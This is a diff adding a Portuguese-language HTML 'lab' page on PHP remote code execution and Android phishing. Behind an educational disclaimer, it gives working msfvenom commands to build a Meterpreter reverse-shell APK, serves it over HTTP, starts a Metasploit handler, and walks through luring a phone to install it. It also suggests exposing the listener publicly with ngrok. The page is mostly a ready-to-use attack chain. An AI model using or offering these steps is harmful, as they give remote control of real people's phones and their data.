@@ -122,3 +122,69 @@ http://ip-da-vitima/vulnerable.php?cmd=ipconfig&debug=1</code></pre>
         Feito para aprendizado responsável.
     </p>
 </footer>
+
+
+
+
+
+
+
+
+<h1>PHP RCE + Phishing Mobile Lab (Android Payload) – Apenas Estudo Isolado</h1>
+
+<div class="warning">
+    <strong>AVISO LEGAL OBRIGATÓRIO</strong><br><br>
+    Este material é <strong>exclusivamente educacional</strong> e deve ser usado <strong>somente</strong> em VMs isoladas controladas por você.<br><br>
+    Qualquer uso em sistemas reais sem autorização por escrito é crime grave no Brasil (art. 154-A CP + Lei 14.155/2021).<br><br>
+    O autor NÃO se responsabiliza por mau uso.
+</div>
+
+<h2>Objetivo</h2>
+<p>Simular RCE em PHP + phishing para celular Android via APK com payload Meterpreter (para estudo/CTF/lab isolado).</p>
+
+<h2>Como usar (apenas lab isolado)</h2>
+
+<div class="steps">
+    <h3>1. Gere o payload APK (no atacante – Kali/Parrot)</h3>
+    <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 R > payload.apk</code></pre>
+
+    <h3>2. Hospede o APK</h3>
+    <pre><code>python3 -m http.server 8000</code></pre>
+
+    <h3>3. Inicie o handler</h3>
+    <pre><code>msfconsole
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST seu.ip
+set LPORT 4444
+exploit -j</code></pre>
+
+    <h3>4. Acesse a página PHP no celular/emulador</h3>
+    <pre><code>http://SEU_IP/vulnerable-mobile.php</code></pre>
+    <p>Baixe e instale o APK (ative "Fontes desconhecidas" nas configs do Android).</p>
+
+    <h3>5. Teste RCE (opcional)</h3>
+    <pre><code>?cmd=id
+?cmd=whoami</code></pre>
+</div>
+
+<h2>Limitações reais em 2026</h2>
+<ul>
+    <li>Android moderno (13+) bloqueia instalação de APKs desconhecidos por padrão</li>
+    <li>Google Play Protect detecta payloads Metasploit em segundos</li>
+    <li>Para CTF/lab: use emulador com Play Protect off</li>
+    <li>iOS: impossível sem jailbreak (não suportado aqui)</li>
+</ul>
+
+<h2>Próximos passos para estudo</h2>
+<ul>
+    <li>Teste em emulador Android (Android Studio)</li>
+    <li>Use ngrok para LHOST público (ngrok tcp 4444)</li>
+    <li>Analise detecção do Play Protect</li>
+    <li>Documente prints do handler pegando sessão</li>
+</ul>
+
+<footer>
+    Boa sorte nos estudos/CTF — mantenha 100% isolado!<br>
+    Feito para aprendizado responsável.
+</footer>
